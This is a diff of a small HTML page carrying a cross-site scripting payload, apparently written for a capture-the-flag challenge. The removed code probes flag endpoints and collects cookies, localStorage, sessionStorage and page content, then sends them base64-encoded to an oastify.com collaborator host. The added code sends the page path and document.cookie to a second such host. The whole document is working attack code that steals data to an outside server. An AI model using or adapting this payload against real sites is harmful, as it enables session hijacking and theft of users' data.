@@ -1,44 +1,11 @@
 <!doctype html>
 <meta charset="utf-8">
 <script>
-(async () => {
-  // Beacon we started
-  (new Image).src='https://ne56toffdj4zh3w8al8zj84bu20tokc9.oastify.com/ping?phase=start';
+/* reachability ping */
+(new Image).src='https://pjc8yqkhil91m51afnd1oa9dz45vtnhc.oastify.com/ping';
 
-  // Try to read the flag from a likely endpoint
-  const tryPaths = ['/flag','/admin/flag','/api/flag','/internal/flag'];
-  let got = '';
-  for (const p of tryPaths) {
-    try {
-      const r = await fetch(p, { credentials: 'include', mode: 'same-origin' });
-      if (r.ok) { got = await r.text(); if (got && got.length) break; }
-    } catch(e){}
-  }
-
-  // Also grab cookies / storage (in case the flag is stored there)
-  const data = {
-    loc: location.href,
-    cookie: document.cookie || '',
-    ls: (()=>{try{return JSON.stringify(localStorage)}catch(e){return ''}})(),
-    ss: (()=>{try{return JSON.stringify(sessionStorage)}catch(e){return ''}})(),
-    domFlag: (()=>{
-      try{
-        const el=document.querySelector('#flag, .flag, [data-flag]');
-        return el? el.textContent.trim() : '';
-      }catch(e){return ''}
-    })(),
-    body: got
-  };
-
-  // Exfiltrate (GET beacon)
-  (new Image).src = 'https://ne56toffdj4zh3w8al8zj84bu20tokc9.oastify.com/x?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
-
-  // Fallback post (some infra blocks long query strings)
-  try {
-    await fetch('https://<your-collab>/post', {
-      method:'POST', mode:'no-cors',
-      body: JSON.stringify(data)
-    });
-  } catch(e){}
-})();
+/* exfil only path + cookies */
+(new Image).src='https://pjc8yqkhil91m51afnd1oa9dz45vtnhc.oastify.com/x'
+  + '?path=' + encodeURIComponent(location.pathname)
+  + '&cookie=' + encodeURIComponent(document.cookie||'');
 </script>
